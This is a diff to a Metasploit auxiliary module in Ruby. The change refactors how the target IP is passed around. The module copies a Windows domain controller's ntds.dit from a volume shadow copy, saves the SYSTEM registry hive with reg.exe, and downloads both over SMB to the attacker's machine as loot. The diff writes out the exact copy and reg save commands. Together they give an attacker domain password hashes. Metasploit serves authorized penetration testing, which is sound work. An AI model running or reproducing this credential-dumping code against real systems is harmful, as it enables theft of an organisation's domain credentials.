@@ -88,9 +88,9 @@ class Metasploit3 < Msf::Auxiliary
 				end
 			end
 			if vscpath
-				if copy_ntds(@ip, vscpath, text) and copy_sys_hive(@ip)
-					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"), @ip)
-					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"), @ip)
+				if copy_ntds(vscpath, text) and copy_sys_hive
+					download_ntds((datastore['WINPATH'] + "\\Temp\\ntds"))
+					download_sys_hive((datastore['WINPATH'] + "\\Temp\\sys"))
 				else
 					print_error("#{peer} - Failed to find a volume shadow copy.  Issuing cleanup command sequence.")
 				end
@@ -149,7 +149,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Copy ntds.dit from the Volume Shadow copy to the Windows Temp directory on the target host
-	def copy_ntds(ip, vscpath, text)
+	def copy_ntds(vscpath, text)
 		begin
 			ntdspath = vscpath.to_s + "\\" + datastore['WINPATH'] + "\\NTDS\\ntds.dit"
 			command = "%COMSPEC% /C copy /Y \"#{ntdspath}\" %WINDIR%\\Temp\\ntds"
@@ -179,7 +179,7 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Copies the SYSTEM hive file to the Temp directory on the target host
-	def copy_sys_hive(ip)
+	def copy_sys_hive
 		begin
 			# Try to crate the sys hive copy
 			command = "%COMSPEC% /C reg.exe save HKLM\\SYSTEM %WINDIR%\\Temp\\sys /y"
@@ -192,14 +192,14 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Download the ntds.dit copy to your attacking machine
-	def download_ntds(file, ip)
+	def download_ntds(file)
 		print_status("#{peer} - Downloading ntds.dit file")
 		begin
 			# Try to download ntds.dit
 			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
-			store_loot("NTDS.database", "data", ip, data, "ntds.dit", nil, nil)
+			store_loot("NTDS.database", "data", @ip, data, "ntds.dit", nil, nil)
 			remotefile.close
 		rescue StandardError => ntdsdownloaderror
 			print_error("#{peer} - Unable to downlaod ntds.dit: #{ntdsdownloaderror}")
@@ -210,14 +210,14 @@ class Metasploit3 < Msf::Auxiliary
 
 
 	# Download the SYSTEM hive copy to your attacking machine
-	def download_sys_hive(file, ip)
+	def download_sys_hive(file)
 		print_status("#{peer} - Downloading SYSTEM hive file")
 		begin
 			# Try to download SYSTEM hive
 			simple.connect("\\\\#{@ip}\\#{@smbshare}")
 			remotefile = simple.open("#{file}", 'rob')
 			data = remotefile.read
-			store_loot("Registry.hive.system", "binary/reg", ip, data, "system-hive", nil, nil)
+			store_loot("Registry.hive.system", "binary/reg", @ip, data, "system-hive", nil, nil)
 			remotefile.close
 		rescue StandardError => sysdownloaderror
 			print_error("#{peer} - Unable to download SYSTEM hive: #{sysdownloaderror}")
